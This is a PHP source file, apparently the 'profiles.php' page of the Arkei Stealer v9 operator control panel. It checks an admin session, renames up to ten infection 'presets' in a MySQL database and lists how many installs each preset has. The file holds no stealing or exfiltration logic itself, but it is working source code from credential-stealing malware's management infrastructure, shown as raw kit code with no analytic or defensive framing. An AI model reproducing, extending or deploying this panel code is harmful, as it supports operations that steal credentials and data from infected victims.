<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [profiles.php]
*    Profiles
*/

session_start();
error_reporting(0);

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$userProfile = $_SESSION["profile"];

if($userProfile != "0")
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit(0);
}

$pageName = "Profiles";

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$profile_1_name  = checkParam($_POST["profile_1_name"]);
	$profile_2_name  = checkParam($_POST["profile_2_name"]);
	$profile_3_name  = checkParam($_POST["profile_3_name"]);
	$profile_4_name  = checkParam($_POST["profile_4_name"]);
	$profile_5_name  = checkParam($_POST["profile_5_name"]);
	$profile_6_name  = checkParam($_POST["profile_6_name"]);
	$profile_7_name  = checkParam($_POST["profile_7_name"]);
	$profile_8_name  = checkParam($_POST["profile_8_name"]);
	$profile_9_name  = checkParam($_POST["profile_9_name"]);
	$profile_10_name = checkParam($_POST["profile_10_name"]);
	
	$profile_1_name  = mysqli_real_escape_string($database, $profile_1_name);
	$profile_2_name  = mysqli_real_escape_string($database, $profile_2_name);
	$profile_3_name  = mysqli_real_escape_string($database, $profile_3_name);
	$profile_4_name  = mysqli_real_escape_string($database, $profile_4_name);
	$profile_5_name  = mysqli_real_escape_string($database, $profile_5_name);
	$profile_6_name  = mysqli_real_escape_string($database, $profile_6_name);
	$profile_7_name  = mysqli_real_escape_string($database, $profile_7_name);
	$profile_8_name  = mysqli_real_escape_string($database, $profile_8_name);
	$profile_9_name  = mysqli_real_escape_string($database, $profile_9_name);
	$profile_10_name = mysqli_real_escape_string($database, $profile_10_name);

	if($profile_1_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_1_name' WHERE `id`='1';");

	if($profile_2_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_2_name' WHERE `id`='2';");

	if($profile_3_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_3_name' WHERE `id`='3';");

	if($profile_4_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_4_name' WHERE `id`='4';");

	if($profile_5_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_5_name' WHERE `id`='5';");

	if($profile_6_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_6_name' WHERE `id`='6';");

	if($profile_7_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_7_name' WHERE `id`='7';");

	if($profile_8_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_8_name' WHERE `id`='8';");

	if($profile_9_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_9_name' WHERE `id`='9';");

	if($profile_10_name != "")
		$database->query("UPDATE `profiles` SET `Name`='$profile_10_name' WHERE `id`='10';");
	
	$profiles = $database->query("SELECT * FROM `profiles`;");
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
					<h4 class="page-title">Presets</h4>
				</div>
			</div>
		</div> 
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
						<h4 class="header-title">Presets</h4>
							<form class="form-horizontal" action="" method="POST">
								<div class="table-responsive mt-3" style="overflow-x: inherit;">
									<table class="table table-hover table-centered mb-0">
										<thead>
											<tr>
												<th>ID</th>
												<th>Name</th>
												<th>Installs</th>
												<th>Actions</th>
											</tr>
										</thead>
										
										<tbody>
										<?php
										while ($profile = $profiles->fetch_assoc())
										{
										
										?>
											<tr>
												<td><b>#<? echo $profile["id"]; ?></b></td>
												<td><input class="form-control" name="profile_<? echo $profile["id"]; ?>_name" value="<? echo $profile["Name"]; ?>" type="text"></td>
												<td><? echo $profile["Count"]; ?></td>
												<td><button type="submit" class="btn btn-primary">Save</button></td>
											</tr>
											
										<?php
										}
										?>
										</tbody>
									</table>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");

?>